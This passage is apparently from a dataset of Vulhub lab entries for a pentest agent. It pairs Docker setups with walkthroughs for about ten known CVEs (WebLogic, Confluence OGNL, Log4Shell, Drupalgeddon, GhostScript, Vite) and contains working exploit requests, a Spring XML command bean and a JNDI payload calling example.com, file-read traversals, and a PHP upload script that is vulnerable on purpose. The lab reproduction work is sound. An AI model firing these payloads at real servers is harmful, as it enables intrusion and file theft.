Code\n\n```python\nfrom django.apps import AppConfig\n\n\nclass XssConfig(AppConfig):\n    name = 'xss'\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/__init__.py\n\n- Extension: .py\n- Language: python\n- Size: 0 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/migrations/0001_initial.py\n\n- Extension: .py\n- Language: python\n- Size: 590 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n# -*- coding: utf-8 -*-\n# Generated by Django 1.11.4 on 2017-09-08 05:07\nfrom __future__ import unicode_literals\n\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='User',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('username', models.CharField(max_length=32, unique=True, verbose_name='Username')),\n            ],\n        ),\n    ]\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/migrations/__init__.py\n\n- Extension: .py\n- Language: python\n- Size: 0 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n\n```\n\n",
    "readme": "# Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDjango is a high-level Python web framework that encourages rapid development and clean, pragmatic design.\n\nDjango versions before 1.11.5 and 1.10.8 contain a cross-site scripting (XSS) vulnerability in the debug error page. When DEBUG mode is enabled, error pages could potentially expose sensitive information through unescaped HTML in the error message.\n\nThe vulnerability is triggered when a database error occurs and its details are displayed in the debug page. The error message from the database is not properly escaped before being rendered in the template.\n\nReferences:\n\n- <https://www.djangoproject.com/weblog/2017/sep/05/security-releases/>\n- <https://nvd.nist.gov/vuln/detail/CVE-2017-12794>\n- <https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Django server (the version of Django is 1.11.4):\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can access the Django home page at `http://your-ip:8000`.\n\n## Vulnerability Reproduction\n\nVisit the following URL to create a user with a malicious username containing JavaScript code:\n\n```\nhttp://your-ip:8000/create_user/?username=<script>alert(1)</script>\n```\n\nThe first request will succeed. Then, visit the same URL again to trigger a database unique constraint error. The error page will include the unescaped username in the error message:\n\n![](1.png)\n\nThe JavaScript code in the username will be executed in the browser, demonstrating the XSS vulnerability. This vulnerability could be exploited by attackers to execute arbitrary JavaScript code in the context of the debug page, potentially leading to session hijacking or other client-side attacks.\n\nFor detailed principle of this vulnerability, please refer to the third link in the references section: <https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html>\n"
  },
  {
    "filename": "CVE-2020-14882.md",
    "filenamenomd": "CVE-2020-14882",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2020-14882/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2020-14882/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n weblogic:\n   image: vulhub/weblogic:12.2.1.3-2018\n   ports:\n    - \"7001:7001\"\n\n```\n\n",
    "readme": "# Weblogic Pre-Auth Remote Command Execution (CVE-2020-14882, CVE-2020-14883)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOracle WebLogic Server is the industry leading application server for building enterprise applications using Java EE standards, and deploying them on a reliable, scalable runtime with low cost of ownership.\n\nIn [Oracle Critical Patch Update Advisory - October 2020](https://www.oracle.com/security-alerts/cpuoct2020traditional.html), Oracle fixed two security vulnerabilities submitted by security researcher @Voidfyoo from Chaitin Tech, CVE-2020-14882 and CVE-2020-14883.\n\nCVE-2020-14882 allows remote users to bypass the authentication in administrator console component, and CVE-2020-14883 allows authencated user to execute any command on administrator console component. Using a chain of these two vulnerabilities, unauthenticated remote attacker can execute arbitrary commands on the Oracle WebLogic server over HTTP and take complete control of the host.\n\nReferences:\n\n- https://www.oracle.com/security-alerts/cpuoct2020traditional.html\n- https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf\n\n## Environment Setup\n\nStart a Weblogic server 12.2.1.3 by executing the following command:\n\n```\ndocker compose up -d\n```\n\nAfter the startup is complete, visit `http://your-ip:7001/console` to view the administrator console login page.\n\n## Exploit\n\nUsing this URL to bypass the authentication of Console component:\n\n```\nhttp://your-ip:7001/console/css/%252e%252e%252fconsole.portal\n```\n\n![](1.png)\n\nAt this moment, you don't have permission to upload a webshell:\n\n![](2.png)\n\nThe second vulnerability, CVE-2020-14883, there are two ways to exploit, one is through `com.tangosol.coherence.mvel2.sh.ShellSession`, and the other is through `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`.\n\nVisit the following URL to chain 2 vulnerabilities and execute commands from `com.tangosol.coherence.mvel2.sh.ShellSession`:\n\n```\nhttp://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\")\n```\n\n`touch /tmp/success1` has been successfully executed inside the container:\n\n![](3.png)\n\nThis method of exploit can only be used in Weblogic 12.2.1 and above, because 10.3.6 doesn't have the class `com.tangosol.coherence.mvel2.sh.ShellSession`.\n\n`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` is a more common exploit, which was first introduced in CVE-2019-2725 and is useable for any Weblogic versions.\n\nTo exploit the `FileSystemXmlApplicationContext`, you need to make a crafted XML file and serve it on a server that Weblogic can access, such as `http://example.com/rce.xml`:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n        <constructor-arg>\n          <list>\n            <value>bash</value>\n            <value>-c</value>\n            <value><![CDATA[touch /tmp/success2]]></value>\n          </list>\n        </constructor-arg>\n    </bean>\n</beans>\n```\n\nThen through the following URL, Weblogic would load this XML and execute the commands in it:\n\n```\nhttp://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://example.com/rce.xml\")\n```\n\n![](4.png)\n\nThe shortcomings of this exploit is that, it requires the Weblogic server to be able to access the malicious XML.\n"
  },
  {
    "filename": "CVE-2022-26134.md",
    "filenamenomd": "CVE-2022-26134",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2022-26134/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2022-26134/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 242 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/confluence:7.13.6\n    ports:\n      - \"8090:8090\"\n    depends_on:\n      - db\n  db:\n    image: postgres:12.8-alpine\n    environment: \n    - POSTGRES_PASSWORD=postgres\n    - POSTGRES_DB=confluence\n\n```\n\n",
    "readme": "# Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nConfluence is a web-based corporate wiki developed by Australian software company Atlassian.\n\nOn June 02, 2022 Atlassian released a security advisory for their Confluence Server and Data Center applications, highlighting a critical severity unauthenticated remote code execution vulnerability. The OGNL injection vulnerability allows an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance.\n\nReferences:\n\n- <https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html>\n- <https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis>\n\n## Vulnerable Environment\n\nExecute following command to start a Confluence Server 7.13.6:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit ``http://your-ip:8090`` and you will see the installation guide, select \"Trial installation\", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.\n\nFollowing [this guide](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396) to complete the installation.\n\nOn the database configuration page, fill in the form with database address `db`, database name `confluence`, username `postgres`, password `postgres`.\n\n![](1.png)\n\n## Exploit\n\nSimplely send following request to execute arbitrary commands inside an craft OGNL expression and get the response:\n\n```\nGET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1\nHost: your-ip:8090\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\n\n\n```\n\n![](2.png)\n\nThe URL-decoded OGNL expression is `${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))}`.\n"
  },
  {
    "filename": "CVE-2015-5531.md",
    "filenamenomd": "CVE-2015-5531",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-5531/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-5531/elasticsearch.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-5531/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-5531/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 72 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n es:\n   build: .\n   ports:\n    - \"9200:9200\"\n    - \"9300:9300\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-5531/elasticsearch.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 40 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\npath.repo: /usr/share/elasticsearch/repo\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2015-5531/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 153 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/elasticsearch:1.6.0\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nCOPY elasticsearch.yml ./config/\n\nRUN set -ex \\\n    && mkdir -p ./repo\n```\n\n",
    "readme": "# ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nElasticSearch is a distributed, RESTful search and analytics engine.\n\nIn the ElasticSearch versions before 1.6.1, a directory traversal vulnerability exists in ElasticSearch's snapshot and restore functionality, allowing attackers to read arbitrary files on the system.\n\nThe conditions for exploiting this vulnerability vary depending on the specific version of the target: in ElasticSearch 1.5.1 and earlier versions, this vulnerability could be triggered without any configuration; in later versions, the `path.repo` configuration must be set in elasticsearch.yml. This configuration specifies a directory that must be writable and serves as the root location for backup repositories. Without this configuration, the snapshot and restore functionality is disabled by default.\n\nReferences:\n\n- <https://www.exploit-db.com/exploits/38383/>\n- <http://www.freebuf.com/vuls/99942.html>\n\n## Environment Setup\n\nExecute the following commands to build and start an ElasticSearch server 1.6.0:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the environment starts, you can access the ElasticSearch server at `http://your-ip:9200`.\n\n## Vulnerability Reproduction\n\n### 1. Create a Repository\n\n```\nPUT /_snapshot/test HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 108\n\n{\n    \"type\": \"fs\",\n    \"settings\": {\n        \"location\": \"/usr/share/elasticsearch/repo/test\" \n    }\n}\n```\n\n![](1.png)\n\n### 2. Create a Snapshot\n\n```\nPUT /_snapshot/test2 HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 108\n\n{\n    \"type\": \"fs\",\n    \"settings\": {\n        \"location\": \"/usr/share/elasticsearch/repo/test/snapshot-backdata\" \n    }\n}\n```\n\n![](2.png)\n\n### 3. Exploit Directory Traversal to Read Files\n\nSend a request to read arbitrary files using directory traversal. For example, to read `/etc/passwd`:\n\n```\nhttp://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\n```\n\n![](3.png)\n\nThe file content will be included in the error message (encoded). After decoding, you can obtain the file content:\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2019-9193.md",
    "filenamenomd": "CVE-2019-9193",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/postgres/CVE-2019-9193/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/postgres/CVE-2019-9193/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 142 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n postgres:\n   image: vulhub/postgres:10.7\n   ports:\n    - \"5432:5432\"\n   environment:\n    - POSTGRES_PASSWORD=postgres\n\n```\n\n",
    "readme": "# PostgreSQL Arbitrary Command Execution with Admin Privileges (CVE-2019-9193)\n\n[中文文档](README.zh-cn.md)\n\nPostgreSQL is a powerful open-source relational database system. A \"feature\" exists in versions 9.3 through 11 that allows administrators or users with \"COPY TO/FROM PROGRAM\" privileges to execute arbitrary commands on the system.\n\nReferences:\n\n- <https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable PostgreSQL 10.7 server:\n\n```\ndocker compose up -d\n```\n\nThe server will start and listen on the default PostgreSQL port 5432, with default credentials postgres/postgres.\n\n## Vulnerability Reproduction\n\nFirst, connect to the PostgreSQL server and execute the following proof of concept:\n\n```sql\nDROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;\n```\n\nThe `FROM PROGRAM` statement will execute the `id` command and save the results in the `cmd_exec` table:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2014-3704.md",
    "filenamenomd": "CVE-2014-3704",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2014-3704/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2014-3704/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 202 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/drupal:7.31\n   depends_on:\n    - mysql\n   ports:\n    - \"8080:80\"\n mysql:\n   image: mysql:5.5\n   environment: \n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=drupal\n\n```\n\n",
    "readme": "# Drupal < 7.32 \"Drupalgeddon\" SQL Injection (CVE-2014-3704)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDrupal is a free and open-source web content management framework written in PHP and distributed under the GNU General Public License.\n\nThe expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing crafted keys.\n\nReferences:\n\n- <https://www.drupal.org/SA-CORE-2014-005>\n- <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704>\n\n## Vulnerable Environment\n\nExecute the following command to start a Drupal 7.31.\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse ``http://your-ip:8080`` to see the Drupal installation wizard, and use the default configuration to install it.\n\nNote that the Mysql database name is ``drupal``, the database username and password is ``root``, and the address is ``mysql``:\n\n![](1.png)\n\nAfter the installation is complete, browse the home page.\n\n![](2.png)\n\n## POC\n\nThe SQL injection does not require authentication and can execute malicious SQL statements by sending the following request.\n\n```\nPOST /?q=node&destination=node HTTP/1.1\nHost: your-ip:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 120\n\npass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a\n```\n\nAs can be seen, the SQL statement reports an error message with user data.\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2021-44228.md",
    "filenamenomd": "CVE-2021-44228",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/log4j/CVE-2021-44228/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/log4j/CVE-2021-44228/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 105 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n solr:\n   image: vulhub/solr:8.11.0\n   ports:\n    - \"8983:8983\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Log4j 2 is an upgrade to Log4j that provides significant improvements over its predecessor, Log4j 1.x, and provides many of the improvements available in Logback while fixing some inherent problems in Logback's architecture.\n\nOn Dec 2021, a 0-day exploit in the Apache Log4j2 was discovered. Log4j’s JNDI support has not restricted what names could be resolved. Some protocols like `rmi:` and `ldap:` are unsafe or can allow remote code execution.\n\nReferences:\n\n- https://logging.apache.org/log4j/2.x/security.html\n- https://www.lunasec.io/docs/blog/log4j-zero-day/\n- https://xz.aliyun.com/t/10649\n\n## Vulnerability Environment\n\nApache Log4j2 is not a certain web service, it is just a third-party library, so we can use a application that depend on Log4j2 to demonstrate how to exploit this vulnerability.\n\nExecute following command to start a Apache Solr 8.11.0, which use Log4j 2.14.1:\n\n```\ndocker compose up -d\n```\n\nAfter server start, browse `http://your-ip:8983` to see the admin portal of Apache Solr.\n\n## Exploit\n\nSimply, put the payload `${jndi:dns://${sys:java.version}.example.com}` as the admin action that can trigger the JNDI query.\n\n```\nGET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1\nHost: your-ip:8983\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\nConnection: close\n\n\n```\n\nQuery will be shown at the DNS log:\n\n![](1.png)\n\nBecause the target JDK version is below 8u191, we can use `rmi://` or `ldap://` to run the Java bytecode directly.\n\nFor vulnerability exploitation, you can use the [Java Chains](https://github.com/vulhub/java-chains). First, visit the [Quick Start](https://java-chains.vulhub.org/docs/guide) page to set up Java Chains. Then, follow the [JNDI Basic Exploitation Guide](https://java-chains.vulhub.org/docs/module/jndi#jndibasicpayload) to configure the command `touch /tmp/success` and generate a JNDI LDAP URL Payload. Finally, replace the payload in the previous HTTP request to successfully exploit the vulnerability.\n\n![](2.png)\n\nAs you can see, `touch /tmp/success` is succesful executed:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2025-30208.md",
    "filenamenomd": "CVE-2025-30208",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/vite/CVE-2025-30208/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/vite/CVE-2025-30208/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 77 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/vite:6.2.2\n    ports:\n      - \"5173:5173\"\n\n```\n\n",
    "readme": "# Vite Development Server Arbitrary File Read Bypass (CVE-2025-30208)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nVite is a modern frontend build tool that provides a faster and leaner development experience for modern web projects. It consists of two major parts: a dev server with Hot Module Replacement (HMR) capability, and a build command that bundles your code with Rollup.\n\nIn versions of Vite before 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10, the `server.fs.deny` feature, which is designed to restrict access to files outside of Vite's serving allow list, can be bypassed. By appending `?raw??` or `?import&raw??` to URLs using the `@fs` prefix, an attacker can read arbitrary files on the filesystem, as long as the Node.js process has permission to read them.\n\nThis vulnerability occurs because trailing separators such as `?` are removed in several places during request processing, but are not accounted for in query string regular expressions, leading to the security check bypass.\n\nThis vulnerability is a bypass for the patch of [CNVD-2022-44615](../CNVD-2022-44615/README.md).\n\nReferences:\n\n- <https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w>\n- <https://nvd.nist.gov/vuln/detail/CVE-2025-30208>\n\n## Environment Setup\n\nExecute the following command to start a Vite 6.2.2 development server:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, you can access the Vite development environment at `http://your-ip:5173`.\n\n> Note: The development server of the old version of Vite defaults to port 3000, while the new version defaults to port 5173, please pay attention to the difference.\n\n## Vulnerability Reproduction\n\nThe vulnerability allows an attacker to read arbitrary files on the server's filesystem by bypassing the `server.fs.deny` protection.\n\nFirst, try to access `/etc/passwd` using the standard `@fs` prefix to verify that normal access to files outside the allowed directories is properly blocked:\n\n![](1.png)\n\nYou should receive a 403 Forbidden response because this path is outside of Vite's allowed serving list.\n\nHowever, by appending `?raw??` to the URL, you can bypass this restriction and retrieve the contents of the file:\n\n```\ncurl \"http://your-ip:5173/@fs/etc/passwd?raw??\"\n```\n\nThis request will return the contents of the `/etc/passwd` file:\n\n![](2.png)\n\nAlternatively, you can also use the `?import&raw??` query parameters to achieve the same result.\n"
  },
  {
    "filename": "CVE-2018-19475.md",
    "filenamenomd": "CVE-2018-19475",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-19475/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-19475/poc.png\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-19475/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-19475/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 188 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/imagemagick:7.0.8-20-php\n   command: php -t /var/www/html -S 0.0.0.0:8080\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n    - \"8080:8080\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-19475/poc.png\n\n- Extension: .png\n- Language: unknown\n- Size: 107 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n%!PS\n0 1 300367 {} for\n{save restore} stopped {} if\n(%pipe%id > /tmp/success && cat /tmp/success) (w) file\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-19475/index.php\n\n- Extension: .php\n- Language: php\n- Size: 472 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n\nif (!empty($_FILES)):\n\n$ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\nif (!in_array($ext, ['gif', 'png', 'jpg', 'jpeg'])) {\n    die('Unsupported filetype uploaded.');\n}\n\n$size = shell_exec(\"identify -format '%w x %h' {$_FILES['file_upload']['tmp_name']}\");\n\necho \"Image size is: $size\";\n\nelse:\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<?php\nendif;\n```\n\n",
    "readme": "# GhostScript Sandbox Bypass Command Execution (CVE-2018-19475)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries.\n\nIn late 2018, Man Yue Mo from the Semmle Security Research Team published a variant of [CVE-2018-16509](../CVE-2018-16509), designated as CVE-2018-19475. This vulnerability allows attackers to bypass GhostScript's sandbox through a malicious image and execute arbitrary commands in gs versions prior to 9.26.\n\nReferences:\n\n- <https://blog.semmle.com/ghostscript-CVE-2018-19475/>\n- <https://bugs.ghostscript.com/show_bug.cgi?id=700153>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable environment (including GhostScript 9.25 and ImageMagick 7.0.8-20):\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080` to see an upload component.\n\n## Vulnerability Reproduction\n\nUpload the POC as an image to execute the command `id > /tmp/success && cat /tmp/success`:\n\n```\nPOST /index.php HTTP/1.1\nHost: target\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO\nContent-Length: 279\n\n------WebKitFormBoundaryukZmnyhO\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"1.jpg\"\ncontent-Type=\"image/png\"\n\n%!PS\n0 1 300367 {} for\n{save restore} stopped {} if\n(%pipe%id > /tmp/success && cat /tmp/success) (w) file\n------WebKitFormBoundaryukZmnyhO--\n```\n\nAs you can see, the command will be successfully executed.\n\n![](1.png)\n\nIn real-world scenarios, you may need to use out-of-band techniques to detect the vulnerability as direct output may not be available.\n"
  },
  {
    "filename": "CVE-2023-4450.md",
    "filenamenomd": "CVE-2023-4450",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jimureport/CVE-2023-4450/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jimureport/CVE-2023-4450/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 371 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/jimureport:1.6.0\n   depends_on:\n    - db\n   environment: \n    - MYSQL_HOST=db\n    - MYSQL_PORT=3306\n    - MYSQL_DB=jimureport\n    - MYSQL_USER=root\n    - MYSQL_PASSWORD=root\n   ports:\n    - \"8085:8085\"\n    - \"5005:5005\"\n db:\n   image: mysql:5.7\n   environment: \n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=jimureport\n\n```\n\n",
    "readme": "# JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJimuReport is a open source visualization report platform under JeecgBoot project. In the JimuReport version prior to 1.6.0, there is a FreeMarker server side template injection (SSTI) issue that is able to execute arbitrary commands.\n\nReferences:\n\n- <https://github.com/advisories/GHSA-j8h5-8rrr-m6j9>\n- <https://whoopsunix.com/docs/java/named%20module/>\n- <https://www.reajason.eu.org/writing/freemarkersstimemshell/>\n\n## Vulnerable Environment\n\nExecute following command to start a JimuReport 1.6.0 server:\n\n```\ndocker compose up -d\n```\n\nWait a few seconds and you can see the index page of JimuReport on `http://your-ip:8085`.\n\n## Exploit\n\nSend the following request to execute the FreeMarker template `<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}`:\n\n```\nPOST /jmreport/queryFieldBySql HTTP/1.1\nHost: localhost:8085\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 100\n\n{\"sql\":\"select 'result:<#assign 